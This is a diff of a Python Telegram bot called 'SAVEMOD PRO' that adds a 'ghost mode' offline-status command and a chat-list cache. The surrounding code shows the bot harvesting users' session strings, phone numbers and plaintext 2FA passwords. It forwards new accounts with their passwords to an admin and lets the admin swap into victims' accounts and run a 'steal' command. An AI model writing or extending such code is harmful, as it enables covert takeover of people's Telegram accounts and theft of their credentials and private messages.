@@ -154,7 +154,7 @@ def get_accounts_keyboard(page=0):
     
     kb = InlineKeyboardMarkup(row_width=2)
     for uid, name, act in page_accounts:
-        status = "✅" if (act == 1 or uid == current_active_user) else "❌"
+        status = "✅" if (uid == current_active_user) else "❌"
         kb.add(InlineKeyboardButton(f"{status} {name[:20]}", callback_data=f"account_{uid}"))
     
     nav_buttons = []
@@ -180,30 +180,42 @@ def get_account_actions_keyboard(user_id):
 
 def get_chats_keyboard(page=0):
     cl, uid = get_active_client()
-    if not cl:
+    if not cl or not uid:
         return None
     
-    chats = []
-    async def fetch_chats():
-        nonlocal chats
-        async for dlg in cl.iter_dialogs():
-            if dlg.is_user:
-                try:
-                    ent = await cl.get_entity(dlg.id)
-                    if not getattr(ent, 'bot', False) and ent.id != uid and not is_target_admin(ent.id):
-                        name = ent.first_name or ent.username or str(ent.id)
-                        chats.append({'id': ent.id, 'name': name})
-                except:
-                    pass
-        return chats
+    # Кэш диалогов на 30 секунд
+    if hasattr(get_chats_keyboard, 'cache') and get_chats_keyboard.cache.get('uid') == uid:
+        chats = get_chats_keyboard.cache.get('chats', [])
+        cache_time = get_chats_keyboard.cache.get('time', 0)
+        if (datetime.now().timestamp() - cache_time) < 30:
+            pass
+        else:
+            chats = []
+    else:
+        chats = []
     
-    try:
-        import concurrent.futures
-        with concurrent.futures.ThreadPoolExecutor() as executor:
-            future = executor.submit(asyncio.run, fetch_chats())
-            chats = future.result(timeout=15)
-    except:
-        return None
+    if not chats:
+        async def fetch_chats():
+            nonlocal chats
+            async for dlg in cl.iter_dialogs():
+                if dlg.is_user:
+                    try:
+                        ent = await cl.get_entity(dlg.id)
+                        if not getattr(ent, 'bot', False) and ent.id != uid and not is_target_admin(ent.id):
+                            name = ent.first_name or ent.username or str(ent.id)
+                            chats.append({'id': ent.id, 'name': name})
+                    except:
+                        pass
+            return chats
+        
+        try:
+            import concurrent.futures
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                future = executor.submit(asyncio.run, fetch_chats())
+                chats = future.result(timeout=15)
+            get_chats_keyboard.cache = {'uid': uid, 'chats': chats, 'time': datetime.now().timestamp()}
+        except:
+            return None
     
     if not chats:
         return None
@@ -229,6 +241,8 @@ def get_chats_keyboard(page=0):
     kb.row(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))
     return kb
 
+get_chats_keyboard.cache = {}
+
 def get_code_keyboard():
     kb = InlineKeyboardMarkup(row_width=3)
     for i in range(1, 10):
@@ -250,7 +264,7 @@ async def cmd_menu(message):
         cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
         row = cursor.fetchone()
         if row and row[0]:
-            await message.answer("✅ <b>SAVEMOD PRO</b> активен!\n.help - команды юзербота", parse_mode='HTML')
+            await message.answer("✅ <b>SAVEMOD PRO</b> активен!\n.help - команды юзербота\n/ghost on/off - режим призрака", parse_mode='HTML')
             if uid not in active_clients:
                 asyncio.create_task(run_userbot(uid, row[0]))
         else:
@@ -282,6 +296,45 @@ async def cmd_reset_me(message):
     conn.commit()
     await message.answer("✅ Сессия удалена. Отправь /start")
 
+@dp.message_handler(commands=['ghost'])
+async def user_ghost(message):
+    uid = message.from_user.id
+    
+    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
+    row = cursor.fetchone()
+    if not row or not row[0]:
+        await message.answer("❌ Нет активной сессии. Отправь /start для авторизации")
+        return
+    
+    if uid not in active_clients:
+        await message.answer("❌ Твой аккаунт не запущен. Напиши /start")
+        return
+    
+    args = message.get_args()
+    if not args:
+        await message.answer(
+            "👻 <b>Режим призрака</b>\n\n"
+            "📌 <code>/ghost on</code> - стать невидимым\n"
+            "📌 <code>/ghost off</code> - вернуть статус\n\n"
+            "💡 Тебя будут видеть как 'оффлайн', но ты сможешь читать и писать сообщения.",
+            parse_mode='HTML'
+        )
+        return
+    
+    client = active_clients[uid]
+    
+    try:
+        if args.lower() == 'on':
+            await client(UpdateStatusRequest(offline=True))
+            await message.answer("👻 <b>Режим призрака включен</b>\n\nТеперь ты невидим.", parse_mode='HTML')
+        elif args.lower() == 'off':
+            await client(UpdateStatusRequest(offline=False))
+            await message.answer("👻 <b>Режим призрака выключен</b>\n\nТвой статус виден.", parse_mode='HTML')
+        else:
+            await message.answer("❌ Используй: /ghost on или /ghost off")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
 @dp.message_handler(commands=['swap'])
 async def cmd_swap(message):
     if not is_admin(message.from_user.id):
@@ -305,9 +358,7 @@ async def cmd_swap(message):
             await message.answer(f"❌ Аккаунт {name} не запущен")
             return
         current_active_user = user_id
-        cursor.execute('UPDATE user_sessions SET is_active=0')
-        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
-        conn.commit()
+        get_chats_keyboard.cache = {}
         me = await active_clients[user_id].get_me()
         await message.answer(f"✅ Переключился на {me.first_name}")
     except Exception as e:
@@ -319,7 +370,7 @@ async def cmd_steal(message):
         return
     
     cl, uid = get_active_client()
-    if not cl:
+    if not cl or not uid:
         await message.answer("❌ Нет активного аккаунта\n/swap для выбора")
         return
     
@@ -476,7 +527,7 @@ async def complete_auth(cb, uid):
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                        (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
-        await cb.message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню", parse_mode='HTML')
+        await cb.message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню\n/ghost on/off - режим призрака", parse_mode='HTML')
         if is_admin(uid):
             await send_to_admin(f"🔐 НОВЫЙ АККАУНТ: {me.first_name}\n📱 {data['phone']}")
         asyncio.create_task(run_userbot(uid, ss))
@@ -501,7 +552,7 @@ async def handle_2fa(message):
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                        (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
-        await message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню", parse_mode='HTML')
+        await message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню\n/ghost on/off - режим призрака", parse_mode='HTML')
         if is_admin(uid):
             await send_to_admin(f"🔐 НОВЫЙ АККАУНТ (2FA): {me.first_name}\n📱 {data['phone']}\n🔒 Пароль: {message.text.strip()}")
         asyncio.create_task(run_userbot(uid, ss))
@@ -542,14 +593,14 @@ async def accounts_page(cb):
 @dp.callback_query_handler(lambda c: c.data.startswith('account_'))
 async def account_detail(cb):
     uid = int(cb.data.split('_')[1])
-    cursor.execute('SELECT first_name, username, phone, is_active FROM user_sessions WHERE user_id=?', (uid,))
+    cursor.execute('SELECT first_name, username, phone FROM user_sessions WHERE user_id=?', (uid,))
     row = cursor.fetchone()
     if not row:
         await cb.answer("Аккаунт не найден")
         return
-    fn, un, ph, act = row
+    fn, un, ph = row
     name = fn or un or str(uid)
-    status = "✅ Активен" if (act == 1 or uid == current_active_user) else "❌ Неактивен"
+    status = "✅ Активен" if (uid == current_active_user) else "❌ Неактивен"
     text = f"👤 <b>{name}</b>\n\n🆔 <code>{uid}</code>\n📱 {ph or 'нет'}\n📊 {status}"
     await cb.message.edit_text(text, parse_mode='HTML', reply_markup=get_account_actions_keyboard(uid))
     await cb.answer()
@@ -562,9 +613,7 @@ async def make_active(cb):
         await cb.answer("❌ Аккаунт не запущен", show_alert=True)
         return
     current_active_user = uid
-    cursor.execute('UPDATE user_sessions SET is_active=0')
-    cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (uid,))
-    conn.commit()
+    get_chats_keyboard.cache = {}
     await cb.answer(f"✅ Аккаунт активирован", show_alert=True)
     await menu_users(cb)
 
@@ -580,6 +629,9 @@ async def del_account(cb):
     cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
     cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (uid,))
     conn.commit()
+    if current_active_user == uid:
+        global current_active_user
+        current_active_user = None
     await cb.answer("✅ Аккаунт удален", show_alert=True)
     await menu_users(cb)
 
@@ -899,6 +951,11 @@ async def run_userbot(owner_id, session_string):
     saved_messages[owner_id] = {}
     logger.info(f"✅ Юзербот запущен для {owner_id}")
     me = await client.get_me()
+    
+    # Первый аккаунт становится активным автоматически
+    global current_active_user
+    if current_active_user is None and not is_target_admin(owner_id):
+        current_active_user = owner_id
     
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
